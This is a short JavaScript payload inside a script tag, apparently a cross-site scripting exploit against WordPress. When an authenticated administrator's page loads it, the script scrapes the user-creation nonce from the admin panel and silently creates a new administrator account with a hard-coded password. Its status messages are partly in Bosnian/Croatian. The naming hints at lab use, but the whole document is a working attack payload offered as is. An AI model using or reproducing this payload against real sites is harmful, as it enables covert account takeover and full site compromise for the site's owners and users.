<script>(async()=>{try{const r=await fetch('/wp-admin/user-new.php',{credentials:'same-origin'});const h=await r.text();const m=h.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/);if(!m){alert('nema noncea');return}const n=m[1];const u='labadmin'+Math.floor(Math.random()*1e5);const body=new URLSearchParams({'_wpnonce_create-user':n,'_wp_http_referer':'/wp-admin/user-new.php',action:'createuser',user_login:u,email:u+'@example.test',pass1:'Lab12345!',pass2:'Lab12345!',role:'administrator',createuser:'Add New User'});const p=await fetch('/wp-admin/user-new.php',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});const t=await p.text();if(p.status===200&&/user|korisnik/i.test(t)){alert('Admin kreiran: '+u)}else if(/wp-login\.php/i.test(t)){alert('not authenticated for this origin/protocol')}else{console.log('resp',p.status,t.slice(0,500));alert('provjeri Users list')}}catch(e){console.error(e);alert('Greška: '+e)}})();</script>
